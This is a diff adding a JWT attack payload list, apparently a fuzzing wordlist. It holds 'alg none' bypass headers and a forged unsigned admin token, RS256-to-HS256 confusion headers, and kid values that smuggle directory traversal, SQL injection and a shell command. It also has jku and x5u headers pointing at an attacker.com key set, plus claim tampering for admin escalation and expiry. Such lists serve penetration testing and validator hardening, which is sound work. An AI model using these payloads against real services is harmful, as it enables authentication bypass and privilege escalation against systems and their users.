@@ -1,0 +1,37 @@
+# Algorithm None bypass
+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"nOnE"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+
+# Algorithm confusion RS256 -> HS256
+{"alg":"HS256","typ":"JWT"}
+{"alg":"HS384","typ":"JWT"}
+{"alg":"HS512","typ":"JWT"}
+
+# kid injection - directory traversal
+{"alg":"HS256","kid":"../../../../../../dev/null"}
+{"alg":"HS256","kid":"../../../../../../etc/hostname"}
+
+# kid injection - SQL injection
+{"alg":"HS256","kid":"key1' UNION SELECT 'secret' -- "}
+{"alg":"HS256","kid":"key1' OR '1'='1"}
+
+# kid injection - command injection
+{"alg":"HS256","kid":"key1|/usr/bin/id"}
+
+# jku / x5u manipulation
+{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
+{"alg":"RS256","jku":"https://target.com@attacker.com/jwks.json"}
+{"alg":"RS256","jku":"https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json"}
+{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
+
+# Claim tampering - exp manipulation
+{"sub":"admin","exp":99999999999}
+{"sub":"admin","exp":0}
+
+# Claim tampering - role/sub escalation
+{"sub":"admin","role":"admin"}
+{"sub":"admin","admin":true,"role":"superadmin"}
+{"sub":"admin","iss":"trusted-issuer.com"}
